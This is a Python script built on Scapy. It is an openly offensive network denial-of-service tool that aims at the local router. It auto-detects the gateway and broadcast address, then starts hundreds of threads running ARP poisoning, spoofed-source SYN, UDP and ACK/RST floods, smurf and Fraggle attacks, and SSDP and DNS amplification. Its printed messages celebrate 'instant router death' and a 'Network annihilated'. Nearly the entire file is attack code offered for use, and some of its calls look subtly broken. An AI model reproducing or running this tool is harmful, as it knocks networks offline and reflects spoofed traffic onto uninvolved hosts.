from scapy.all import *
import threading
import random
import netifaces
import argparse
import time
import ipaddress  # NEW: For rock-solid broadcast calc

conf.verb = 0  # No Scapy spam

# Pre-computed pools – max speed in hot loops
IP_POOL = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10000)]
PORT_POOL = [80, 443, 53, 22, 8080, 8443, 1900, 5060, 7]

TARGET = None
BROADCAST = None
IFACE = None

# === BULLETPROOF AUTO NETWORK DETECTION ===
def get_local_network():
    print("[*] Auto-detecting network...")
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    iface = gateways['default'][netifaces.AF_INET][1]
    addrs = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
    local_ip = addrs['addr']
    netmask = addrs['netmask']
    
    # Use ipaddress module – handles everything perfectly
    network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
    broadcast = str(network.broadcast_address)
    
    print(f"[+] Router (TARGET): {default_gateway}")
    print(f"[+] Broadcast: {broadcast}")
    print(f"[+] Interface: {iface}")
    
    return default_gateway, broadcast, iface

# === INSANE THROUGHPUT ATTACKS ===
def arp_poison():
    while True:
        send(ARP(op=2, psrc=random.choice(IP_POOL), pdst=TARGET, hwdst="ff:ff:ff:ff:ff:ff"), iface=IFACE, count=150)

def syn_flood():
    base = IP(dst=TARGET)
    while True:
        send(base.src(random.choice(IP_POOL)) / TCP(sport=random.randint(1024,65535), dport=random.choice(PORT_POOL), flags="S"), iface=IFACE, count=250)

def udp_flood():
    payload = Raw(RandString(size=1200))
    base = IP(dst=TARGET)
    while True:
        send(base.src(random.choice(IP_POOL)) / UDP(sport=random.randint(1024,65535), dport=random.choice(PORT_POOL)) / payload, iface=IFACE, count=200)

def icmp_smurf():
    pkt = IP(src=TARGET, dst=BROADCAST) / ICMP(type=8) / Raw("X"*1400)
    while True:
        send(pkt, iface=IFACE, count=400)

def ssdp_amplification():
    payload = Raw("M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\nST:upnp:rootdevice\r\n\r\n")
    base = IP(dst=BROADCAST) / UDP(dport=1900) / payload
    while True:
        send(base.src(random.choice(IP_POOL)), iface=IFACE, count=300)

def fraggle_attack():
    pkt = IP(src=TARGET, dst=BROADCAST) / UDP(dport=7) / Raw("DIE"*200)
    while True:
        send(pkt, iface=IFACE, count=350)

def dns_amplification():
    dns = DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY"))
    pkt = IP(src=TARGET, dst=BROADCAST) / UDP(dport=53) / dns
    while True:
        send(pkt, iface=IFACE, count=250)

def tcp_ack_rst_storm():
    base = IP(dst=TARGET)
    while True:
        send(base.src(random.choice(IP_POOL)) / TCP(sport=random.randint(1024,65535), dport=random.choice([80,443]), flags=random.choice(["A","R"])), iface=IFACE, count=400)

# === LAUNCHER ===
def launch_optimized_flood(threads=800):
    global TARGET, BROADCAST, IFACE
    TARGET, BROADCAST, IFACE = get_local_network()
    
    print(f"\n[+] LAUNCHING OPTIMIZED 8-VECTOR DESTRUCTION")
    print(f"[+] Target: {TARGET} | Broadcast: {BROADCAST} | Threads: {threads}")
    print(f"[+] Expecting >2M packets/sec combined – instant router death")
    
    attacks = [arp_poison, syn_flood, udp_flood, icmp_smurf, ssdp_amplification, fraggle_attack, dns_amplification, tcp_ack_rst_storm]
    per_attack = threads // len(attacks)
    
    for func in attacks:
        for _ in range(per_attack):
            t = threading.Thread(target=func, daemon=True)
            t.start()
    
    print("[+] Flood live. Watch the router lights go insane.")

# === MAIN ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Override auto-detected interface")
    parser.add_argument("-t", "--threads", type=int, default=800, help="Total threads")
    args = parser.parse_args()
    
    if args.interface:
        IFACE = args.interface
    
    launch_optimized_flood(threads=args.threads)
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n[+] Attack terminated. Network annihilated.")
